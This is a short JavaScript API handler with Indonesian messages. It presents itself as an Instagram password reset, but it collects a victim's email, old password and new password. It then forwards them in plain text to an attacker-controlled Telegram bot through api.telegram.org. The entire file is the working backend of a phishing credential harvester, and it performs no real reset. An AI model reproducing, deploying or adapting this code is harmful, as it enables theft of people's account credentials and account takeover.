import https from 'https';
import { config } from 'dotenv';

config();

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Metode tidak diizinkan' });
  }

  const { email, oldPass, newPass } = req.body;

  if (!email || !oldPass || !newPass) {
    return res.status(400).json({ message: 'Data tidak lengkap' });
  }

  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ message: 'Konfigurasi tidak ditemukan' });
  }

  const message = `
🔐 *Reset Password Instagram*
👤 Email: \`${email}\`
🔑 Password Lama: \`${oldPass}\`
🆕 Password Baru: \`${newPass}\`
  `.trim();

  const data = JSON.stringify({
    chat_id: chatId,
    text: message,
    parse_mode: 'Markdown'
  });

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${botToken}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const telegramReq = https.request(options, (telegramRes) => {
    let body = '';
    telegramRes.on('data', (chunk) => (body += chunk));
    telegramRes.on('end', () => {
      if (telegramRes.statusCode === 200) {
        res.status(200).json({ message: 'Berhasil' });
      } else {
        res.status(500).json({ message: 'Gagal mengirim ke Telegram' });
      }
    });
  });

  telegramReq.on('error', (e) => {
    console.error('Telegram Error:', e);
    res.status(500).json({ message: 'Gagal mengirim ke Telegram' });
  });

  telegramReq.write(data);
  telegramReq.end();
}
